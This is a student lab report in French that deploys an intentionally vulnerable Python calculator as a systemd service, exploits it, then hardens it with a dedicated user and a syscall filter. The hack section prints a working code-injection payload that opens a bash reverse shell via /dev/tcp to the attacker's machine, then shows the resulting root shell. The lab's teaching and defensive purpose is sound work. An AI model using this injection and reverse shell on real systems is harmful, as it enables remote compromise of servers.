# Part IV : My shitty app

**[une application Python (toute pourrie) codée avec mes mains](./calc.py) :**

- elle écoute sur un port TCP
- un client peut se connecter (genre avec `nc`)
- le client peut soumettre une opération arithmétique
- l'application calcule le résultat et l'envoie au client
- l'application se termine

## 1. Création de service

🌞 **Créer un service `calculatrice.service`**

```ini
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always

[Install]
WantedBy=multi-user.target
```

🌞 **Indiquer à systemd que vous avez modifié les services**

```bash
# on indique à systemd de relire les fichiers de définition de service
sudo systemctl daemon-reload
```

🌞 **Vérifier que ce nouveau service est bien reconnu***

- exécutez un simple `systemctl status calculatrice`
```ps
[dums@vbox ~]$ systemctl status calculatrice
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; enabled; preset: disabled)
     Active: active (running) since Wed 2025-02-19 22:30:50 CET; 1min 23s ago
   Main PID: 1359 (python3)
      Tasks: 1 (limit: 11101)
     Memory: 3.3M
        CPU: 44ms
     CGroup: /system.slice/calculatrice.service
             └─1359 /usr/bin/python3 /opt/calc.py

Feb 19 22:30:50 vbox systemd[1]: Started Super serveur calculatrice.
```

🌞 **Vous devez pouvoir utiliser l'application normalement :**

- on peut se connecter depuis notre PC
```ps
PS C:\Users\cleme> ncat 10.1.1.11 13337
hello
Hello3+3
6
```
- l'affichage de l'application est disponible dans les logs : 
```ps
journalctl -xe -u calculatrice
Feb 19 22:30:50 vbox systemd[1]: Started Super serveur calculatrice.
   Subject: A start job for unit calculatrice.service has finished successfully
   Defined-By: systemd
   Support: https://wiki.rockylinux.org/rocky/support  
   A start job for unit calculatrice.service has finished successfully.
  
   The job identifier is 907. 
```

## 3. Hack

🌞 **Hack l'application**




J'ai utilisé un reverse shell vers le port 4444 de ma machine perso.
Voila ce que j'écris dans l'application : 
```ps
PS C:\Users\cleme> ncat 10.1.1.11 13337
hello
Hello__import__('os').system('bash -c "bash -i >& /dev/tcp/10.1.1.0/4444 0>&1"')
```
Dans mon reverse shell : 
```ps
PS C:\Users\cleme> ncat -lvnp 4444
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.1.1.11:44150.
bash: cannot set terminal process group (1496): Inappropriate ioctl for device
bash: no job control in this shell
[root@vbox /]# whoami
whoami
root
[root@vbox /]# shutdown now
shutdown now
[root@vbox /]#
PS C:\Users\cleme>
```

## 4. Harden

### A. Utilisateurs

🌞 **Prouvez que le service s'exécute actuellement en `root`**

```ps 
[dums@vbox ~]$ ps aux | grep calc.py
root         680  0.0  0.4  10892  8576 ?        Ss   23:30   0:00 /usr/bin/python3 /opt/calc.py
```
```ps
[dums@vbox ~]$ ps aux | grep calculatrice
dums        1302  0.0  0.1   6408  2304 pts/0    S+   23:36   0:00 grep --color=auto calculatrice
```

🌞 **Créer l'utilisateur `calculatrice`**

```ps
sudo useradd -r -s /sbin/nologin -M calculatrice
```

🌞 **Adaptez les permissions**

```ps
sudo chown calculatrice:calculatrice /opt/calc.py
```
```ps
sudo chmod 700 /opt/calc.py
```
🌞 **Modifier le `.service`**

- On ajoute la clause `User=calculatrice`

🌞 **Prouvez que le service s'exécute désormais en tant que `calculatrice`**

```ps
[dums@vbox ~]$ ps aux | grep calc.py
calcula+    1353  0.7  0.4  10828  8192 ?        Ss   23:43   0:00 /usr/bin/python3 /opt/calc.py
dums        1355  0.0  0.1   6412  2304 pts/0    S+   23:43   0:00 grep --color=auto calc.py
```

### B. Syscalls

Bon bah ouais on revient au thème du TP, vous le voyez venir :D

🌞 **Tracez l'exécution de l'application : normal**

- effectuez un tracing avec `strace` ou `sysdig`
- donnez dans le compte-rendu la liste des syscalls effectués par l'application `calc.py` pendant son fonctionnement normal

sortie sysdig --> [calculatrice.scap](./calculatrice.scap)

🌞 **Tracez l'exécution de l'application : hack**

- vous voyez un ou plusieurs syscalls en plus ? Si oui, lesquels ?

```ps
switch
```



🌞 **Adaptez le `.service`**

- ajoutez un filtrage des *syscalls* dans le fichier `calculatrice.service`
- vérifiez que l'exploitation est devenue plus compliquée

```ps
[dums@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
User=calculatrice
Restart=always

SystemCallFilter=~fork clone vfork

[Install]
WantedBy=multi-user.target
```